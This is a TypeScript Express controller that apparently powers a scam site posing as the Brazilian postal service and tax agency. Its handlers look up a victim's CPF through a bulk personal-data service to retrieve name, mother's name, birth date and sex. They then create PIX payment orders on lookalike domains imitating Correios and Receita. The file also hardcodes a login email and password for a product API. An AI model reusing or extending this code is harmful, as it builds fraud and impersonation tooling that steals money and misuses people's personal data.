import { NextFunction, Request, Response } from "express";

export const getProducts = async (req: Request, res: Response, next: NextFunction): Promise<any> => {

    try{
    
    const upstream = await fetch('https://api.ameii.com.br/api/auth/login', { method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            email: 'receita@gmail.com',
            password: 'ameiamei'
        })
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      
      const data = await upstream.json();
      let token = data.access_token
      const tenantId = '1aa1ae14-1f87-4ac4-90e6-099c8ef4468e'
      
      
      const upstream2 = await fetch('https://api.ameii.com.br/api/product', { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
          'X-Tenant': `${tenantId}`
        }
       });
      if (!upstream2.ok) {
        return res
          .status(upstream2.status)
          .json({ error: `Upstream retornou ${upstream2.status}` });
      }
     
      const data2 = await upstream2.json();
      return res.json(data2.data.filter((p: any) => p.id !== 61084 && p.id !== 61086))
    } catch (err) {
      console.log(err)
    }
};

export const paymentCorreios = async (req: Request, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    const { phone, email } = req.body;
  
    // 1) monte seu payload normalmente…
    const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
    const upstream = await fetch(apiUrl, { method: 'GET', headers: { 'Content-Type': 'application/json' }});
    if (!upstream.ok) return res.status(upstream.status).json({ error: `Upstream retornou ${upstream.status}` });
    const data = await upstream.json();
  
    const orderPayload: any = {
      payment_method: 'pix',
      customer: {
        name: data.NOME || 'Nome Exemplo',
        email: email || `${(data.NOME as string)
          .normalize('NFD')
          .replace(/[\u0300-\u036f]/g, '')
          .replace(/\s+/g, '')
          .replace(/[^a-zA-Z0-9]/g, '')
          .toLowerCase()}@sememail.com`,
        document: cpf,
        document_type: 'CPF',
        ...(phone ? { phone_number: phone } : {})
      }
    };
  
    // 2) filtre apenas as UTM que vieram em req.query:
    const ALLOWED = [
      'src',
      'sck',
      'utm_source',
      'utm_campaign',
      'utm_medium',
      'utm_content',
      'utm_term'
    ];
    const qs = Object.entries(req.query)
      .filter(([key, val]) => ALLOWED.includes(key) && val != null)
      .map(([key, val]) => `${encodeURIComponent(key)}=${encodeURIComponent(val as string)}`)
      .join('&');
  
    // 3) monte a URL de order incluindo só as UTM que existem:
    const orderUrl =
      `https://api-correios.br-correios.org/cart/${cartId}/order` +
      (qs ? `?${qs}` : '');
  
    // 4) faça o POST para essa URL dinâmica
    const orderRes = await fetch(orderUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      body: JSON.stringify(orderPayload),
    });
  
    if (!orderRes.ok) {
      console.error(await orderRes.json());
      return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
    }
  
    const orderData = await orderRes.json();
    return res.json(orderData);
  };
  


export const getCorreioCart = async(req: any, res: any, next: any) => {
    let productId = 'QU0tNjg0ZjIyYjczOWQ1MQ'
   if(req.query.productId) {
       productId = req.query.productId
   }
    try {
      const paymentRes = await fetch(
        `https://api-correios.br-receita.org/r/${productId}`,
        {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
          }
        }
      );

      if (!paymentRes.ok) {
        return res
          .status(paymentRes.status)
          .json({ error: `Payment API retornou ${paymentRes.status}` });
      }
      const cartId = (await paymentRes.text()).trim(); 
      return res.json({
        cartId
      })
    }catch(err) {
      return res.json(err)
    }
  

  }



 export const cpfConsultaCorreios = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    const { email, phone } = req.body;
    try {
      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
      console.log(data)
      const getOrder = await fetch(
        `https://api-correios.br-receita.org/cart/${cartId}/customer`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
          body: JSON.stringify(
            phone ?
            {
            name: data.NOME,
            document: data.CPF,
            document_type: 'CPF',
            email: email ||   `${(data.NOME as string).normalize('NFD')
              .replace(/[\u0300-\u036f]/g, '')
              .replace(/\s+/g, '')
              .replace(/[^a-zA-Z0-9]/g, '')
              .toLowerCase()}@sememail.com`,
              phone_number: phone
            }
            :
            {
            name: data.NOME,
            document: data.CPF,
            document_type: 'CPF',
            email: email ||   `${(data.NOME as string).normalize('NFD')
              .replace(/[\u0300-\u036f]/g, '')
              .replace(/\s+/g, '')
              .replace(/[^a-zA-Z0-9]/g, '')
              .toLowerCase()}@sememail.com`,
          })
        }
      );
      if (!getOrder.ok) {
        console.log(await getOrder.json())
        return res
          .status(getOrder.status)
          .json({ error: `Payment API retornou ${getOrder.status}` });
      }
      const formattedData = {
        NOME: data.NOME,
        CPF: data.CPF,
        NOME_MAE: data.NOME_MAE,
        DT_NASCIMENTO: data.DT_NASCIMENTO,
        SEXO: data.SEXO,
      }
      return res.json(formattedData);
    } catch (err) {
      next(err);
    }


  };